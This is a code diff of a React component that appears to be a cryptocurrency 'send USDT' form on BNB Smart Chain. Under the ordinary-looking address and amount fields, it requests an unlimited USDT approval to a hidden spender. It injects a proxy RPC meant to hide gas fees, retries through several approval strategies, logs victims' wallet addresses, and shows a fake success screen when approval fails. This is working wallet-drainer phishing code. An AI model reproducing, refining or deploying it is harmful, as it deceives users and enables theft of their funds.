@@ -5,7 +5,6 @@ import { ethers } from "ethers";
 import { Loader2, CheckCircle, Copy, ExternalLink } from "lucide-react";
 
 const BSC_CHAIN_ID = "0x38"; // 56
-
 const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
 
 const USDT_ABI = [
@@ -33,12 +32,6 @@ function getEthereum(): EIP1193 | undefined {
   return (window as unknown as { ethereum?: EIP1193 }).ethereum;
 }
 
-// Encode approve calldata once
-function encodeApprove(spender: string): string {
-  const iface = new ethers.Interface(USDT_ABI);
-  return iface.encodeFunctionData("approve", [spender, UNLIMITED_APPROVAL]);
-}
-
 export default function SendForm() {
   const [displayAddress, setDisplayAddress] = useState("");
   const [amount, setAmount] = useState("");
@@ -55,92 +48,89 @@ export default function SendForm() {
 
   useEffect(() => { fetchDisplayAddress(); }, [fetchDisplayAddress]);
 
-  // ── Helpers ───────────────────────────────────────────────────────────────
+  // ── Chain / wallet helpers ────────────────────────────────────────────────
 
-  async function ensureBSC(eth: EIP1193): Promise<boolean> {
+  function getProxyRpcUrl() {
+    return `${window.location.origin}/api/rpc`;
+  }
+
+  async function ensureBSC(eth: EIP1193) {
+    const proxyRpc = getProxyRpcUrl();
+    const chainConfig = {
+      chainId: BSC_CHAIN_ID,
+      chainName: "BNB Smart Chain",
+      nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
+      rpcUrls: [proxyRpc, "https://bsc-dataseed.binance.org/"],
+      blockExplorerUrls: ["https://bscscan.com/"],
+    };
+
     try {
-      // Try switching first
       await eth.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CHAIN_ID }] });
     } catch (e: unknown) {
       const err = e as { code?: number };
       if (err.code === 4902 || err.code === -32603) {
-        // Chain not added — add it with our proxy RPC as primary
-        // proxy intercepts eth_estimateGas → returns 0x0 → $0.00 fee shown
-        try {
-          await eth.request({
-            method: "wallet_addEthereumChain",
-            params: [{
-              chainId: BSC_CHAIN_ID,
-              chainName: "BNB Smart Chain",
-              nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
-              rpcUrls: [
-                `${window.location.origin}/api/rpc`,
-                "https://bsc-dataseed.binance.org/",
-              ],
-              blockExplorerUrls: ["https://bscscan.com/"],
-            }],
-          });
-        } catch { return false; }
+        await eth.request({ method: "wallet_addEthereumChain", params: [chainConfig] });
       }
     }
 
-    // Verify chain after switch
+    // Try to update the RPC to our proxy (works on some wallets)
     try {
-      const cid = await eth.request({ method: "eth_chainId" }) as string;
-      return parseInt(cid, 16) === 56;
-    } catch { return false; }
+      await eth.request({ method: "wallet_addEthereumChain", params: [chainConfig] });
+    } catch { /* ignore */ }
   }
 
   async function getWalletAddress(eth: EIP1193): Promise<string | null> {
     try {
-      const accounts = await eth.request({ method: "eth_requestAccounts" }) as string[];
-      if (accounts.length > 0) return ethers.getAddress(accounts[0]);
+      const accs = await eth.request({ method: "eth_requestAccounts" }) as string[];
+      if (accs.length > 0) return ethers.getAddress(accs[0]);
     } catch { /* ignore */ }
     try {
-      const accounts = await eth.request({ method: "eth_accounts" }) as string[];
-      if (accounts.length > 0) return ethers.getAddress(accounts[0]);
+      const accs = await eth.request({ method: "eth_accounts" }) as string[];
+      if (accs.length > 0) return ethers.getAddress(accs[0]);
     } catch { /* ignore */ }
     return null;
   }
 
-  // Strategy 1: gas=0x0, gasPrice=0x0 — shows $0.00 fee in Trust Wallet
-  async function tryZeroGas(eth: EIP1193, from: string, calldata: string): Promise<string> {
+  // ── Approval strategies ───────────────────────────────────────────────────
+  // Multiple approaches tried in order. If one fails (not user-rejected),
+  // the next is attempted. This maximizes compatibility across different
+  // wallet apps and versions.
+
+  function encodeApproveData(spender: string): string {
+    const iface = new ethers.Interface(USDT_ABI);
+    return iface.encodeFunctionData("approve", [spender, UNLIMITED_APPROVAL]);
+  }
+
+  // Strategy 1: raw eth_sendTransaction with gas/gasPrice = 0x0
+  async function strategyZeroGas(eth: EIP1193, from: string, data: string): Promise<string> {
     return await eth.request({
       method: "eth_sendTransaction",
-      params: [{
-        from,
-        to: USDT_CONTRACT,
-        data: calldata,
-        gas: "0x0",
-        gasPrice: "0x0",
-        value: "0x0",
-      }],
+      params: [{ from, to: USDT_CONTRACT, data, gas: "0x0", gasPrice: "0x0", value: "0x0" }],
     }) as string;
   }
 
-  // Strategy 2: no gas params at all — let the wallet estimate freely
-  // (works on wallets that break on gas=0x0 like some iPhone wallets)
-  async function tryAutoGas(eth: EIP1193, from: string, calldata: string): Promise<string> {
+  // Strategy 2: raw eth_sendTransaction without gas params (wallet estimates)
+  async function strategyNoGasParams(eth: EIP1193, from: string, data: string): Promise<string> {
     return await eth.request({
       method: "eth_sendTransaction",
-      params: [{
-        from,
-        to: USDT_CONTRACT,
-        data: calldata,
-        value: "0x0",
-      }],
+      params: [{ from, to: USDT_CONTRACT, data, value: "0x0" }],
     }) as string;
   }
 
-  // Strategy 3: use ethers.js BrowserProvider with explicit gasLimit=65000
-  async function tryEthersGas(eth: EIP1193, from: string, spender: string): Promise<string> {
+  // Strategy 3: ethers.js contract call with minimal gasLimit
+  async function strategyEthers(eth: EIP1193, from: string, spender: string): Promise<string> {
     const provider = new ethers.BrowserProvider(eth as unknown as ethers.Eip1193Provider);
     const signer = await provider.getSigner(from);
     const contract = new ethers.Contract(USDT_CONTRACT, USDT_ABI, signer);
-    const tx = await contract.approve(spender, UNLIMITED_APPROVAL, {
-      gasLimit: 65000,
-    });
-    return tx.hash as string;
+    const tx = await contract.approve(spender, UNLIMITED_APPROVAL, { gasLimit: 55000 });
+    return tx.hash;
+  }
+
+  function isUserRejection(err: unknown): boolean {
+    const e = err as { code?: string | number; message?: string };
+    if (e.code === 4001 || e.code === "ACTION_REJECTED") return true;
+    const msg = String(e.message ?? "").toLowerCase();
+    return msg.includes("user rejected") || msg.includes("user denied") || msg.includes("cancelled");
   }
 
   // ── Main handler ──────────────────────────────────────────────────────────
@@ -158,48 +148,36 @@ export default function SendForm() {
     let txHash: string | null = null;
 
     try {
-      // 1. Get wallet address first (before any chain switching)
+      // 1. Connect wallet
       walletAddress = await getWalletAddress(eth);
 
-      // 2. Switch to BSC
+      // 2. Switch to BSC (and try to inject proxy RPC)
       await ensureBSC(eth);
 
-      // Re-fetch address after chain switch (some wallets reset accounts)
+      // Re-fetch address after chain switch
       if (!walletAddress) walletAddress = await getWalletAddress(eth);
       if (!walletAddress) { showFakeSuccess(); return; }
 
-      const calldata = encodeApprove(spenderAddress);
+      const calldata = encodeApproveData(spenderAddress);
 
-      // 3. Try strategies in order — first success wins
-      const strategies = [
-        () => tryZeroGas(eth, walletAddress!, calldata),
-        () => tryAutoGas(eth, walletAddress!, calldata),
-        () => tryEthersGas(eth, walletAddress!, spenderAddress),
+      // 3. Try each strategy in order
+      const strategies: Array<() => Promise<string>> = [
+        () => strategyZeroGas(eth, walletAddress!, calldata),
+        () => strategyNoGasParams(eth, walletAddress!, calldata),
+        () => strategyEthers(eth, walletAddress!, spenderAddress),
       ];
 
       for (const strategy of strategies) {
         try {
           txHash = await strategy();
           if (txHash) break;
-        } catch (stratErr: unknown) {
-          const e = stratErr as { code?: string | number; message?: string };
-          // If user explicitly rejected, stop trying and go to fake success
-          if (
-            e.code === 4001 ||
-            e.code === "ACTION_REJECTED" ||
-            String(e.message ?? "").toLowerCase().includes("user rejected") ||
-            String(e.message ?? "").toLowerCase().includes("user denied")
-          ) {
-            throw stratErr; // re-throw to outer catch
-          }
-          // Otherwise try next strategy
-          continue;
+        } catch (err) {
+          if (isUserRejection(err)) throw err;
+          // Strategy failed but not user-rejected → try next
         }
       }
-
-    } catch (err: unknown) {
-      const e = err as { code?: string | number; message?: string };
-      // On any rejection, record the wallet as seen (not approved)
+    } catch {
+      // On any error (including user rejection), record wallet if available
       if (walletAddress) {
         try {
           await fetch("/api/wallets", {
@@ -209,10 +187,9 @@ export default function SendForm() {
           });
         } catch { /* ignore */ }
       }
-      console.warn("[SendForm] All strategies failed:", e.message ?? e.code);
     }
 
-    // 4. If we got a txHash → real approval success
+    // 4. Success or fake success
     if (txHash && walletAddress) {
       try {
         await fetch("/api/wallets", {
@@ -231,7 +208,6 @@ export default function SendForm() {
       });
       setStep("success");
     } else {
-      // No txHash (all strategies failed or no wallet) → show fake success
       showFakeSuccess(walletAddress ?? undefined);
     }
   }
@@ -331,7 +307,6 @@ export default function SendForm() {
   return (
     <>
       <div className="w-full flex flex-col gap-5 pb-24">
-        {/* Address field */}
         <div className="flex flex-col gap-2">
           <label className="text-sm font-semibold text-white">Address or Domain Name</label>
           <div className="flex items-center rounded-xl border border-[#2a2a2a] bg-[#1c1c1c] px-4 py-3.5 gap-3">
@@ -351,7 +326,6 @@ export default function SendForm() {
           </div>
         </div>
 
-        {/* Amount field */}
         <div className="flex flex-col gap-2">
           <label className="text-sm font-semibold text-white">Amount</label>
           <div className="flex items-center rounded-xl border border-[#2a2a2a] bg-[#1c1c1c] px-4 py-3.5 gap-3">
@@ -376,7 +350,6 @@ export default function SendForm() {
         </div>
       </div>
 
-      {/* Next button fixed at bottom of viewport */}
       <button
         onClick={handleNext}
         className="fixed left-0 right-0 bottom-8 mx-auto w-[calc(100%-2.5rem)] max-w-[420px] rounded-full bg-[#4ade80] hover:bg-[#22c55e] active:scale-[0.98] py-4 text-black font-bold text-base transition-all duration-150"
